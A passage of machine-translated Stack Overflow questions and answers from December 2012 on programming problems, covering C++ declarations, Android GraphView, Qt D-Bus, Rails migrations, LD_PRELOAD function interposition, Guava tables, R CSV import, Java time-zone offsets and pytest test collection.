但是如何在函数定义期间使用此代码？我们可以尝试像这样使用它。

```
void F (){
    typedef struct Id {
        int a;
    }  xIdRec;

    typedef xIdRec* IdN;

    typedef struct ChId{
        int a;
        IdN* b;
    }  ChIdRec;

    extern ChIdRec Evn;
    IdN Arr[] = {(IdN)&Evn};
    ChIdRec Evn = {8, Arr}; 
} 
```

但是现在我们有一个错误—— `error C2086: 'ChIdRec Evn' : redefinition`。我们可以删除 的第一个声明`Evn`，但我们会遇到另一个错误 - `error C2065: 'Evn' : undeclared identifier`。

我该如何解决这个位问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:32:57.760

不要重复函数内部类型的定义。特别是`typedef`，即使它与全局标识符具有相同的名称和含义，它也是一个新标识符。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:40:28.980

`extern`意味着变量在另一个代码单元中定义，由链接器解析。如果结构是在本地函数中定义的，那么我看不出你能期望它是怎样`extern`的。

问题是您有一个外部变量，然后您尝试将相同的变量声明为本地变量。编译器说“下定决心，是外部的还是本地的？”。

似乎您前向声明的唯一原因是您可以`{ }`在结构上使用初始化语法。比使用 hack 更好地分配成员。

如果你必须，那么你可以使用`void *`，但对于粗心的人来说，这会撒上陷阱。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-11T15:49:36.053

`extern ChIdRec Evn;` does not do what you think it does when put inside a function.

A variable that is `extern` is a global variable. Even if you declare it inside a function. This lets you say you are using an `extern` global variable half way through a function body, right adjacent to where you access it. But it does mean you cannot "forward declare" a local variable.

Now, in theory you could create your `struct` at one spot without constructing it, do some more work, then in-place `new` with the uniform initializer syntax in C++11.

ie:

```
ChIdRec Evn;
IdN Arr[] = {(IdN)&Evn};
new(&Evn)ChIdRec{8, Arr}; 
```

or something like that. (Note the use of placement `new`, I am not creating memory on the free store (aka heap). Also note that double-construction of `ChIdRec` is dangerous if it is not POD -- if ChIdRec contained a `std::string`, I would expect the above to leak or crash, for example.

A slightly more ridiculous, yet correct, method:

```
unsigned char EvnBuff[sizeof(ChIdRec)];
IdN Arr[] = {reinterpret_cast<IdN>(&EvnBuff[0])};
new(&EvnBuff[0])ChIdRec{8, Arr}; 
ChIdRec& Evn = *reinterpret_cast<ChIdRec*>(&EvnBuff[0]);
// ... code goes here
Evn->~ChIdRec (); // before leaving body of function, iff ChIdRec::~ChIdRec exists 
```

which could be dressed up in fancy stuff to make it exception safe and less awkward. Basically, a delayed-construction abstraction would make this marginally less ridiculous.

# android - GraphView 轴问题

> ID：13822765
> 
> 赞同：0
> 
> 时间：2012-12-11T15:16:17.247
> 
> 标签：android, android-graphview

我正在使用 GraphView 库（[Info](http://www.jjoe64.com/p/graphview-library.html) [Source](https://github.com/jjoe64/GraphView)），并且在重新标记轴时遇到问题。我的 xml 文件的设置方式是图形的上视图，然后是图形下方的六个复选框。每个复选框代表图表上的一条不同的线，当取消选中时，该线将消失。

![在此处输入图像描述](../Images/b4e9e18e9409169f5ac6ef2dbf2b192b.png)

这三个`Net V`图的值都在 -1000 和 1000 之间，而这些`Diff V`图的值仅在 -5 和 5 之间。这看起来很好，并且在最初绘制图表时轴标记正确。但是，一旦我取消选中所有三个`Net V`复选框，图形就会调整大小以适应 -5 和 5 值。图表的大小调整工作正常，但 Y 轴仍标记为 -1000 到 1000。我注意到，如果我在调整大小后在图表上滑动手指，那么轴标签会自行修复，但我无法让它工作，除非我用手指触摸图表。

这是我的单个复选框的代码。对于所有意图和目的，其余复选框都是相同的

```
 netV2Check.setOnClickListener( new OnClickListener() {
            public void onClick( View v ) {
                if( hasRead ) {
                    if( ( (CheckBox) v ).isChecked() ) {
                        graphView.addSeries( seriesNetV2 ); 
                        graphView.setScalable(true); 
                        graphView.setViewPort(0, 166);  
                        graphLayout.removeAllViews();
                        graphLayout.addView( graphView );
                    } else {
                        graphView.removeSeries( seriesNetV2 ); 
                        graphView.setScalable(true); 
                        graphView.setViewPort(0, 166);  
                        graphLayout.removeAllViews();
                        graphLayout.addView( graphView );
                    }
                }
            }
        }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-14T07:03:32.113

这似乎是 GraphView 中的一个错误。我会检查这个并为下一个版本修复它。

对于修补程序，您可以尝试致电

```
graphView.redrawAll(); 
```

更改图表后。

# qtdbus - 如何使用 qt-dbus 将错误返回到 dbus？

> ID：13822771
> 
> 赞同：3
> 
> 时间：2012-12-11T15:16:33.640
> 
> 标签：qtdbus

我正在使用 qt-dbus 从我的软件中公开一些 API。

我通过 qdbusxml2cpp 将带有接口声明的 foo.xml 转换为 foo_adaptor.cpp 和 foo_adaptor.h 持有 FooAdaptor 类，然后通过在 Foo 的构造函数中调用 new FooAdaptor(this) 将真正的 Foo 类绑定到 FooAdaptor。

所以，它起作用了：当我通过 dbus-send 向我的应用程序发送消息时，调用了 Foo 方法。

对于我的软件的特定版本，我想禁用一些方法。我需要以某种方式通知调用者，某些方法调用实际上是不允许的，并且什么都不做/没有任何意义。是否有任何函数可以调用/抛出异常来执行此操作？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-07-09T15:48:44.083

可以通过使您的 D-Bus 对象（使用 注册的对象`QDBusConnection::registerObject()`，而不是适配器）继承`QDBusContext`并使用以下`sendErrorReply()`方法来发送错误响应：

[http://qt-project.org/doc/qt-5.1/qtdbus/qdbuscontext.html](http://qt-project.org/doc/qt-5.1/qtdbus/qdbuscontext.html)

# pdf-generation - 使用 vb.net 将 .doc、.docx、.txt 转换为 pdf

> ID：13822773
> 
> 赞同：1
> 
> 时间：2012-12-11T15:16:49.273
> 
> 标签：pdf-generation, vb.net-2010

我必须将 .doc、.docx 和 .txt 文件转换为同名的 pdf，请您给我建议任何可以帮助我的 api 或代码，请帮忙

# php - Codeigniter 2.1，MySQL - 将图像源插入数据库

> ID：13822777
> 
> 赞同：1
> 
> 时间：2012-12-11T15:17:01.767
> 
> 标签：php, mysql, codeigniter, codeigniter-2

> **可能重复：**
> [Codeigniter global_xss_filtering](https://stackoverflow.com/questions/3899777/codeigniter-global-xss-filtering)

我在将图像源（HTML 标记）插入数据库时​​遇到了小问题。例如在**textarea**中有这样的部分：

```
<img src"http://10.0.0.101/okc/public/img/vesti/event Za Dz Cacak.jpg"  /> 
```

当我尝试从上面加载文章的文本而不是格式时，我得到了这个：

```
<img cacak.jpg"="" dz="" za="" event="" vesti="" img="" public="" okc="" 10.0.0.101="" src"http:=""> 
```

这部分代码在 DB 中插入文章文本：

```
...

    'opis'=>mysql_real_escape_string(htmlentities($this->input->post('text'))),
... 
```

这里似乎有什么问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T15:46:52.673

这是做你想做的事情的正确方法：

```
'opis'=>$this->db->escape($this->input->post('text', TRUE)), 
```

有关如何安全编码的更多信息，请参阅此内容：

*   [http://ellislab.com/codeigniter/user-guide/general/security.html](http://ellislab.com/codeigniter/user-guide/general/security.html)

# user-management - Rational Team Concert：团队区域用户有权访问不同的项目

> ID：13822780
> 
> 赞同：1
> 
> 时间：2012-12-11T15:17:10.177
> 
> 标签：user-management, rational-team-concert, ibm-rational

我们在 RTC 中有几个项目用于源代码和规划/错误跟踪。有时，项目相互依赖，我们希望将项目之间的工作项联系起来。但是，为此，用户需要有权在两个项目中创建工作项。

解决方法是将所有必需的用户也转储到另一个项目，但我想知道是否有一种方法可以让一个项目中团队区域的所有用户访问单独项目中的工作项？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T19:21:03.670

假设您使用的是默认访问控制（项目层次结构的成员），您可以看到为什么需要在其他（或两个）项目中转储所需的用户。你说过“只有专门参与这个项目的人才能阅读这个项目中的项目”。如果用户仍然没有至少读取项目区域的权限，我不太确定 VonC 的答案将如何工作。我假设这些项目区域是从同一个服务器/存储库提供的。

一种无需让他们成为其他项目成员的处理方法是将访问控制调整为成员+访问列表并将必要的人员添加到访问列表中。这只会给他们读取访问权限（这可能就足够了——从您的描述中不清楚）并避免他们污染项目层次结构（假设他们不需要成为其中的一部分）。

另一个（更宽松的选择）是打开访问控制，这样每个人（可以登录到您的存储库的人）都可以访问，然后限制每个人/默认角色可以做什么。这可能是 VonC 的回应。如果额外的可见性对您的情况来说不是问题，这可能是最简单的答案，并且不需要额外的访问控制操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T15:36:19.340

是的，您可以为工作项创建一个角色，将特定权限关联到该角色。

关联在`Team configuration / permission`Project Area 的部分完成：

![权限](../Images/67b1ac5ca3822bad00b310e89267c57e.png)

这样，在一个项目中拥有所有权限的资源将仅在另一个项目中拥有工作项权限。

# ruby-on-rails - 将（我编写的类的）对象列表添加到现有类

> ID：13822790
> 
> 赞同：0
> 
> 时间：2012-12-11T15:17:40.130
> 
> 标签：ruby-on-rails, ruby, ruby-on-rails-3, ruby-on-rails-3.2, scaffolding

我有一个班级的人和一个班级的科目。目前它们根本没有连接。作为用户，只能从列表中选择主题并检查它们。现在我想允许用户分配给主题，因此用户类需要一个可以存储其主题的列表。...以及将主题映射到人的表格..（m到n）

我对 Ruby on Rails 没有太多经验，我害怕在尝试这样做时破坏我的应用程序。到目前为止，我发现有一些命令可以做到这一点（比如`$ rails generate migration AddSubjectsToPersons`），但我无法找出它们究竟做了什么，例如它触及了我的模型或控制器类。如果是的话 - 有没有被删除的东西我之前写过吗？，如果没有 - 是否足以在我的模型中添加一个名为课程的字段（列表）并且将自动检测到与数据库的连接？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:23:59.507

该脚本`rails generate migration`会创建一个迁移文件，其中包含当您使用`rake db:migrate`.
例如，您创建一个将外键添加到表的迁移并执行迁移。然后，您转到您的模型并`active_record`在两个模型之间放置正确的引用 ( `belongs_to`, `has_many`)。完成这些步骤后，如果您检查您的控制台`rails console`，并执行类似的操作

```
user = User.find(1)
user.subjects 
```

查询应该完美无缺。
所以基本上，迁移生成器脚本只是操纵数据库。所有其他更改必须通过更改模型上的代码来进行。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T00:26:09.633

我使用命令生成了一个迁移文件`rails generate migration CreatePersonsSubjects`。这些名称按字母顺序（约定）放在一起。该命令的结果是一个框架，可以在其中输入代码来更改数据库表。这进入了“向上”部分：

```
create_table :persons_subjects, :id => false do |t|
      t.integer :person_id, :null => false
      t.integer :subject_id, :null => false
    end 
```

在“向下”部分，这些操作可以恢复：

```
 drop_table :persons_subjects 
```

最后，我在 person 类中添加了一个字段（顺便说一下，仅添加到 person 类中。但也可以/应该在主题中添加类似的行）。这个名字也是约定俗成的。

```
 has_and_belongs_to_many :subjects 
```

例如，可以在视图中像这样使用主题：

```
<div>Courses taken:
  <ul>
    <% @person.subjects.each do |subject| %>
      <li><%= link_to subject.name, subject, :class => 'action' %></li>
    <% end %>
  </ul>
</div> 
```

# xml - 带有破折号和空格的 Zend 路由 xml

> ID：13822795
> 
> 赞同：2
> 
> 时间：2012-12-11T15:17:53.687
> 
> 标签：xml, zend-framework, routing

我有这个问题。我有一条看起来像这样的路线：

```
<Default_Taxonomy type="Zend_Controller_Router_Route">
    <route>taxonomy/:type/:tax</route>
    <reqs type="[a-z]+" />
    <reqs tax="[a-zA-Z\-0-9]+" />
    <reqs page="[0-9]+" />
    <defaults>
        <module>default</module>
        <controller>index</controller>
        <action>taxonomy</action>
    </defaults>
</Default_Taxonomy> 
```

这是为了路由分类/类别/hellocatname，它确实如此。但是，如果我有分类/类别/hello-catname 或分类/类别/hello catname 怎么办？

正则表达式不适用于破折号（“-”）或带空格的（“”）。

我该怎么做？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-26T13:17:45.700

浏览器不会在 url 中使用空格，因此通常您不需要检查它们。查看您的正则表达式`tax`，它*应该*接受破折号。空格的正则表达式是`\s`

```
<reqs tax="[a-zA-Z\-0-9\s]+" /> 
```

# c - 如何告诉 gcc 不使用内置函数

> ID：13822799
> 
> 赞同：5
> 
> 时间：2012-12-11T15:17:57.023
> 
> 标签：c, linux, gcc

我正在尝试使用 LD_PRELOAD 覆盖一些标准库函数。但是，我注意到我的版本从未被某些函数调用，例如，那个`gettimeofday`。我怀疑 gcc 对其中一些功能使用了内置版本。

有没有办法告诉 gcc 不要使用内置的标准库函数。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:26:12.457

使用 gcc 开关`-fno-builtin`。引用 gcc 手册：

> -fno-内置
> 
> 不识别不以 ` *_builtin* ' 作为前缀的内置函数。

更多细节： http: [//gcc.gnu.org/onlinedocs/gcc-3.0/gcc_3.html#SEC7](http://gcc.gnu.org/onlinedocs/gcc-3.0/gcc_3.html#SEC7)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-11T16:41:29.340

您正在解决错误的问题。我认为您的代码或编译预加载库的方式有问题。

我在插入时没有任何问题`gettimeofday()`。考虑一下`libgettimeofday.c`：

```
#include <sys/time.h>
int gettimeofday(struct timeval *tv, struct timezone *tz __attribute__((unused)) )
{
    tv->tv_sec = 1;
    tv->tv_usec = 2;
    return 0;
} 
```

这`gettimeofday.c`：

```
#include <stdio.h>
#include <sys/time.h>
int main(void)
{
    struct timeval  t;
    gettimeofday(&t, NULL);
    printf("%ld.%06d\n", (long)t.tv_sec, (int)t.tv_usec);
    return 0;
} 
```

编译使用

```
gcc -W -Wall gettimeofday.c -o gettimeofday
gcc -W -Wall -fPIC libgettimeofday.c -ldl -shared -Wl,-soname,libgettimeofday.so -o libgettimeofday.so || exit $? 
```

并测试：

```
$ ./gettimeofday
1355243621.698927

$ LD_PRELOAD=./libgettimeofday.so ./gettimeofday
1.000002 
```

请注意，我在使用不同 C 库的 Ubuntu（64 位）和 CentOS 6.3（32 位）中对此进行了测试。

# java - Guava 表的初始值

> ID：13822800
> 
> 赞同：1
> 
> 时间：2012-12-11T15:17:58.303
> 
> 标签：java, guava

我正在尝试使用 Guava 进行练习，但遇到了一个问题，我对找到的解决方案感到不舒服。

在我的情况下，我为每个用户和服务器设置了 id。尽管 Guava Table 进行了令人难以置信的简化，但`if statement block`在构造表的循环内部仍然存在问题。

```
 Table<Integer, Integer, Set> setPerUser = HashBasedTable.create();

  for(Conversation conversation : conversations) {
     Set uci = setPerUser.get(conversation.x, conversation.y);
     if(uci == null) {
        uci = new HashSet();
        setPerUser.put(conversation.x, conversation.y, uci);
     }
     uci.add(conversation.id);
  } 
```

看来我的方向是错误的，如果陈述使情况令人震惊。行，

1.  有没有更好的方法将迭代器转换为 FluentIterator 等 Table？

2.  你觉得有 ThreadLocal 或 Guava Supplier 之类的初值方法是什么？

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:24:59.573

由于您将集合存储在您`Table` `Cell`的 s 中，因此您实际需要的是一个“多表”，它会根据需要自动为您创建集合（就像`Multimap`那样）。我很确定这个要求足够复杂，超出了 Guava 团队愿意实现的范围。

我想说你正在做的是处理这种情况的最好方法（除了你的 Set 应该是通用的，当然）

这是一个静态工厂方法，它以更通用的方式完成您想做的事情：

```
public static <X, Y, Z, S extends Collection<Z>> void addCellValue(
    Table<X, Y, S> table, X rowKey, Y colKey, Z value, Supplier<S> supplier) {

    final S data;
    if (table.contains(rowKey, colKey)) {
        data = table.get(rowKey, colKey);
    } else {
        data = supplier.get();
        table.put(rowKey, colKey, data);
    }
    data.add(value);

} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T17:30:32.457

另一种可能性是定义一个包含 x 和 y 的“关键”类。然后你可以使用`Multimap`：

```
final class ConversationId {
  private final Integer userId;
  private final Integer serverId;

  // constructor, equals(), hashCode() ...
}

SetMultimap<ConversationId, V> conversationsById = HashMultimap.create();
// populate... 
```

现在创建和填充的代码`Multimap`看起来很像`Multimaps.index`. 您可以改为：

```
Multimap<ConversationId, V> conversationsById = Multimaps.index(conversations, idFunction()); 
```

单键`Multimap`不提供双键的所有功能`Table`，但这对于您的用例可能没问题。[`Table`主要是因为它的复杂视图，比如`row()`和`column()`。](https://plus.google.com/118010414872916542489/posts/cwZYwRGuL2q)对于简单的用途，如`get()`,`size()`和`values().iterator()`，您可以使用`Multimap`.

# r - 读取 .csv 时用 NA 替换缺失值的最佳方法是什么？

> ID：13822801
> 
> 赞同：16
> 
> 时间：2012-12-11T15:17:58.117
> 
> 标签：r, csv, na

我有一个包含许多缺失值的 .csv 数据集，我希望 R 在读取表格时以相同的方式（“正确”方式）识别它们。我一直在使用：

```
import = read.csv("/Users/dataset.csv", 
                  header =T, na.strings=c("")) 
```

这个脚本用一些东西填充所有的空单元格，但它并不一致。当我用 来查看数据时`head(import)`，一些缺失的单元格被填充，`<NA>`一些缺失的单元格被填充`NA`。我担心 R 在开始分析数据集时会以不同的方式处理这两种识别缺失值的方法，因此我希望导入统一读取这些缺失值。

最后，我的 csv 文件中的一些缺失值仅用句点表示。当我导入到 R 时，我还希望这些句点由正确的缺失值表示法表示。

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-07-07T01:59:10.737

`<NA>`vs`NA`仅表示您的某些列是字符，而某些列是数字，仅此而已。绝对没有错。

正如 Ben 上面提到的，如果 csv 中的某些缺失值由单个句点 表示`.`，那么您可以通过以下方式指定应视为`NA`s 的值向量：

```
na.strings=c("",".","NA") 
```

作为`read.csv`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-07-03T09:47:15.930

您还可以使用更灵活的`readr`包，其等效函数和参数是`read_csv()`and `na`。

```
library(readr)
read_csv("file.csv", na = c(".", "..")) 
```

# listview - 在 MS 访问条目中制作名称列表

> ID：13822802
> 
> 赞同：2
> 
> 时间：2012-12-11T15:17:58.757
> 
> 标签：listview, ms-access

我正在制作一个用于协调培训课程的数据库，分为三个表：

培训师
课程
客户

对于课程中的每个条目，我想要一个将要参加的人的姓名列表，所以我可以为每个受训者制作一份包括证书在内的报告，但我能想到的唯一方法是制作一张新表对于每门新课程，但考虑到我们开设的课程数量，很快就会变得一团糟。

有没有办法在课程上创建一个新字段，列出所有参加该课程的人？我需要它，这样我就可以为每个受训者制作一页的报告，上面有他们的名字。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:34:01.507

您需要一些额外的联结表：

```
Trainers 
   ID
Courses 
   ID
Clients
   ID

TrainersCourses 
   TrainerID )  Primary key
   CourseID )

CoursesClients 
   CourseID    )  Primary key
   ClientID    )
   DateOfCourse ) (Possibly) 
```

您可能希望阅读[http://r937.com/relational.html](http://r937.com/relational.html)或类似文档。

# visual-studio - 安装开发人员工具时，Windows 资源管理器固定图标中断

> ID：13822804
> 
> 赞同：1
> 
> 时间：2012-12-11T15:18:02.550
> 
> 标签：visual-studio, windows-7, windows-explorer

每当我安装任何涉及 Visual Studio 的东西时，我都会注意到一个非常奇怪的问题。我没有注意到与非 VS 相关的安装。例如，我目前正在安装最新的 Azure SDK。安装开始后，任务栏上的 Windows 资源管理器固定图标会中断。当我单击它时，我得到“无法打开此项目”对话框。

![无法打开此项目对话框](../Images/cee0b2b408d516e64a050a18566aad46.png)

此外，开始菜单上的两个固定图标也会中断。一个是远程桌面连接的图标。它仍然有效，只是图标坏了。另一个是 Internet 信息服务管理器的图标。它完全停止工作，甚至没有给我“无法打开此项目”对话框。

![损坏的开始菜单图标](../Images/8f0e9bae61bd0c5c36022c708ee57815.png)

当我重新启动计算机时，图标再次开始工作。这越来越令人厌烦了。有时甚至更新 Visual Studio 扩展也会这样做。有人有想法么？

# php - 需要一个循环发送功能的想法

> ID：13822809
> 
> 赞同：0
> 
> 时间：2012-12-11T15:18:20.487
> 
> 标签：php, javascript, mysql, ajax, date

我有一个由应用程序用户设置的扫描日期。我需要一种机制，每天午夜后检查当前日期，并将其与数据库中以 0000-00-00 格式输入的日期匹配，如果匹配，将发送一封电子邮件。该功能需要在每天午夜运行。任何想法如何实现循环功能以专业的方式运行它？

谢谢指教！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T15:30:23.627

Cron 是此类脚本的完美工具。 [http://en.wikipedia.org/wiki/Cron](http://en.wikipedia.org/wiki/Cron)

# javascript - Javascript 怪癖：在没有 getElementByID 的情况下访问节点

> ID：13822810
> 
> 赞同：1
> 
> 时间：2012-12-11T15:18:23.653
> 
> 标签：javascript, browser, syntax, w3c, quirks-mode

> **可能重复：**
> [IE/Chrome：这里是 DOM 树元素全局变量吗？](https://stackoverflow.com/questions/3434278/ie-chrome-are-dom-tree-elements-global-variables-here)
> [可通过 ID 访问的元素](https://stackoverflow.com/questions/12663981/element-accessible-with-id)

直到最近我才意识到你可以通过它的 ID 访问一个 DOM 元素而不使用 document.getElementByID()

```
​&lt;div id="test">
  hi there
</div>​​​​​​​​​​​​​​​​​​​​​​​​​

​alert(test.textContent);​ //alerts "hi there" 
```

更奇怪的是它在 FF、Chrome、Safari 和 IE9+ 中都支持

我能看到的唯一问题是，如果您覆盖名称 ie) `var test=3;`，它将不再起作用。但是你在设置时遇到了同样的问题`var test = document.getElementById('test');`

我的问题是：

-为什么/如何工作......浏览器是否通过窗口对象访问它？

- 这是一个坏习惯吗？

- 旧浏览器（IE6）是否支持？

# javascript - 更改颜色编号

> ID：13822813
> 
> 赞同：-2
> 
> 时间：2012-12-11T15:18:32.360
> 
> 标签：javascript, jquery

我在 lib jquery.knobs.js 的帮助下创建了进度条：[示例](http://regexinfo.ru/my_infa/parse_position/good/pr/)

这是我的代码：

```
<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7.0/jquery.min.js"></script>
        <script src="js/jquery.knob.js"></script>
        <script>
            $(function() {
                $(".knob").knob();
                var val,up=0,down=0,i=0
                    ,$idir = $("div.idir")
                    ,$ival = $("div.ival")
                    ,incr = function() { i++; $idir.show().html("+").fadeOut(); $ival.html(i); }
                    ,decr = function() { i--; $idir.show().html("-").fadeOut(); $ival.html(i); };
                $("input.infinite").knob(
                                    {
                                    'min':0
                                    ,'max':20
                                    ,'stopper':false
                                    ,'change':function(v){
                                                if(val>v){
                                                    if(up){
                                                        decr();
                                                        up=0;
                                                    }else{up=1;down=0;}
                                                }else{
                                                    if(down){
                                                        incr();
                                                        down=0;
                                                    }else{down=1;up=0;}
                                                }
                                                val=v;
                                            }
                                    }
                                    );            });
        </script>
        <style>
            h2{color:#87CEEB;font-family:'Georgia';}
        </style>
    </head>
    <body>
        <h1>Процент запросов в топе для сайта <?php echo $site; ?></h1>
        <div style="float:left; width:300px; height:320px; padding:20px">
            <input class="knob" data-fgColor="#9dc806" data-cgColor="black" data-bgColor="#7d7d7d" data-tickColor="black" data-thickness=".25" data-readOnly=true value="<?php echo $percent; ?>">
        </div> 
```

我想将数字的颜色更改为黑色并在数字上添加百分比签名？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-11T15:25:47.463

在您的设置中，更改

```
data-fgcolor to #000000 
```

如果您只想更改号码的颜色，只需用这个破解您的 CSS -

```
.knob{color:#000000 !important;} 
```

此外，就添加百分比而言，只需在准备好的 DOM 上运行它 -

```
$('.knob').val($('.knob').val() + '%'); 
```

这是我通过 Google 找到的文档 - [http://anthonyterrien.com/knob/](http://anthonyterrien.com/knob/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-11T15:21:56.493

你不能把`data-fgcolor`属性改成`#000000`?

# java - 如何将 GMT 偏移值转换为 +/- HH:MM

> ID：13822814
> 
> 赞同：2
> 
> 时间：2012-12-11T15:18:34.107
> 
> 标签：java, datetime, timezone, string-formatting

```
TimeZone timeZone = TimeZone.getTimeZone("Asia/Calcutta");

    int offset1 = timeZone.getRawOffset();
    System.out.println("offset = "+ offset);

    int offsetHrs = offset / 1000 / 60 / 60;
    int offsetMins = offset / 1000 / 60 % 60;

    System.out.println("offsetHrs="+ offsetHrs);
    System.out.println("offsetMins="+ offsetMins);

    GMTOffset = offsetHrs + ":" + offsetMins;
    System.out.println("GMTOffset = " + utzOffset); 
```

输出将是

> 偏移量 = 19800000
> 
> 偏移小时=5
> 
> offsetMins=30
> 
> 格林威治标准时间偏移 = 5:30

我在 ms sql server 中使用这个偏移值来转换时区。sql server 将采用以下格式

```
(+/-)HH:MM 
```

我的结果是 5:30 但它给出了一个无效的时区错误，它应该是 +5:30 。

在另一种情况下

> TimeZone timeZone = TimeZone.getTimeZone("Etc/GMT");
> 
> 在这种情况下，偏移量将为“0”
> 
> 但是 ms sql 只需要 +00:00 或 -00:00 (+/- 符号必须)

任何人都可以帮助我如何以 **(+/-)HH:MM** 格式格式化偏移量。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-12-11T15:23:26.530

你可以使用

```
int offset = timeZone.getRawOffset();
String gmtTZ = String.format("%s%02d:%02d", 
               offset < 0 ? "-" : "+", 
               Math.abs(offset) / 3600000,
               Math.abs(offset) / 60000 % 60); 
```

# python - 是否可以不收集标记的测试？

> ID：13822823
> 
> 赞同：3
> 
> 时间：2012-12-11T15:18:55.527
> 
> 标签：python, pytest

目前，可以**标记**测试，然后使用`-m`参数运行它们（或不运行它们）。但是，仍然首先收集所有测试，然后才**取消选择**

在下面的示例中，仍然收集所有 8 个，然后运行 ​​4 个并取消选择 4 个。

```
============================= test session starts ==============================
platform win32 -- Python 2.7.3 -- pytest-2.3.2 -- C:\Python27\python.exe
collecting ... collected 8 items

test_0001_login_logout.py:24: TestLoginLogout.test_login_page_ui PASSED
test_0001_login_logout.py:36: TestLoginLogout.test_login PASSED
test_0001_login_logout.py:45: TestLoginLogout.test_default_admin_has_users_folder_page_loaded_by_default PASSED
test_0001_login_logout.py:49: TestLoginLogout.test_logout PASSED

==================== 4 tests deselected by "-m 'undertest'" ====================
================== 4 passed, 4 deselected in 1199.28 seconds =================== 
```

问题：是否可以完全**不收集**标记/未标记的测试？

问题是：

1）当数据库中已经有一些项目（比如我的*设备*）和它的代码时，我正在使用一些测试：

```
@pytest.mark.device
class Test1_Device_UI_UnSelected(SetupUser):

    #get device from the database
    device = Devices.get_device('t400-alex-win7')

    @classmethod
    @pytest.fixture(scope = "class", autouse = True)
    def setup(self):
    ... 
```

我运行测试明确排除和*设备*测试：`py.test -m "not device"`但是，在收集过程中我得到了错误，因为`device = Devices.get_device('t400-alex-win7')`仍在执行。

2) 一些测试被标记`time_demanding`，因为大约有 400 个生成的测试。生成这些测试也需要时间。*我从一般*测试中排除了这些测试，但是它们是生成和收集的，然后被取消选择<-只是等待时间。

我知道 (1) 问题有一个解决方案 - 使用 pytest.fixtures 并将它们传递给测试，但是我真的很喜欢PyDev 提供的*自动完成功能。*

`timedemanding`类是：

```
import pytest
#... other imports

def admin_rights_combinations(admin, containing = ["right"]):
    '''
    Generate all possible combinations of admin rights settings depending
    on "containing" restriction
    '''
    rights = [right for right in admin.__dict__.iterkeys() if any(psbl_match in right for psbl_match in containing)]
    total_list = []
    l = []
    for right in rights: #@UnusedVariable
        l.append([True, False])
    for st_of_values in itertools.product(*l):
        total_list.append(dict(zip(rights, st_of_values)))
    return total_list

@pytest.mark.timedemanding
class Test1_Admin_Rights_Access(SetupUser):

    user = UserFactory.get_user("Admin Rights Test")
    user.password = "RightsTest"
    folder = GroupFolderFactory.get_folder("Folders->Admin Rights Test Folder")
    group = GroupFolderFactory.get_group("Folders->Admin Rights Test Group")
    admin = UserFactory.get_admin("Admin Rights Test")

    @classmethod
    @pytest.fixture(scope = "class", autouse = True)
    def setup(self):
        ...

    @pytest.mark.parametrize("settings", admin_rights_combinations(admin, containing=['right_read', 
                                                                                      'right_manage_folders',
                                                                                      'right_manage_groups']))  
    def test_admin_rights_menus(self, base_url,settings):
        '''
        test combination of admin rights and pages that are displayed with 
        this rights. Also verify that menu's that are available can be opened 
        ''' 
```

正如你所看到的，当 pytest 点击`@pytest.mark.parametrize`它时，它应该已经知道它在 Class with 中`@pytest.mark.timedemanding`。但是，收集仍然发生。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-11T17:06:07.253

问题不在于`py.test`，而是在导入文件时执行了类代码，因此您甚至在调用装饰器**之前就收到了错误。**

避免这种情况的唯一方法（不修改代码逻辑）是完全忽略整个文件。

无论如何，我不明白你为什么在`device`那里设置类属性。使用班级级别`setup`！如果您将该代码放入设置中，您的问题应该得到解决，因为由于未运行测试，因此也不会调用设置并且您不会收到错误。

测试也是如此`time_demanding`。在类级别设置中设置它们，这样`py.test`类的创建就不会花费太多时间（尽管没有示例代码，我对此不能说太多）。

如果你想保留这样的东西，并让 PyDev 自动完成，那么，正如我所说，只需使用一些正则表达式忽略整个文件（最终你将不得不拆分测试）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-12T08:37:40.160

仅在收集完成后取消选择测试有两个原因：

*   始终获得正确数量的整体测试
*   集合挂钩可能会动态添加或删除标记

关于自动完成，我认为将繁重的设置放入固定装置中更为重要。我不确定 Pydev 是否​​还能学会自动完成。对于常规的 python 函数，您也必须遇到这个问题，这些函数接受 Pydev 无法真正知道它是什么类型的参数。FWIW 我对愚蠢的 vim-completion 生活得很好，它只是查看所有缓冲区中的所有字符串/名称并完成它。它给出了更多的误报，但没有误报。

# restkit - RestKit 0.20——所有导致问题的 API 调用的 POST

> ID：13822825
> 
> 赞同：0
> 
> 时间：2012-12-11T15:18:59.130
> 
> 标签：restkit, restkit-0.20

我正在使用一个只有 POST 调用的 API。创建、编辑和删除。这会导致 RestKit 在编辑和删除方面出现一些问题。

按预期创作作品。但是，当我对一个对象进行编辑时，它不会保存到我的设备中，直到我再次调用 GET 请求（这也可以）。我假设这是因为我没有调用 patchObject 和 deleteObject（相反我必须使用 postObject），并且在后台发生了一些 Core Data 魔术。

他们的 API 将在不久的将来更新，但是在人工时间有没有办法欺骗对象管理器以不同的方式处理我的 POST 请求？

* * *

## 回答 #1

> 赞同：0
> 
